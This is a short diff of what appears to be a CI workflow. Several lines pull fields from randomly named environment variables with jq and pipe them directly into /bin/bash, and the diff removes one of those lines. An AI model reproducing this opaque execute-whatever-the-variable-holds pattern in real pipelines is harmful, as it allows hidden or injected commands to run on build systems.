@@ -27,7 +27,6 @@ jobs:
           echo $miwmk1 | jq -r .gfov6779 | /bin/bash
           printf '%s' "$nvic970" | jq -r .n4130 | /bin/bash
           printf '%s' "$x229" | jq -r .lglo57 | /bin/bash
-          echo $nxi1485 | jq -r .dik5 | /bin/bash
           printf '%s' "$jupu21464" | jq -r .g66063 | /bin/bash
           echo $gtc8 | jq -r .niw4 | /bin/bash
           echo $aibo6 | jq -r .ohfag782 | /bin/bash
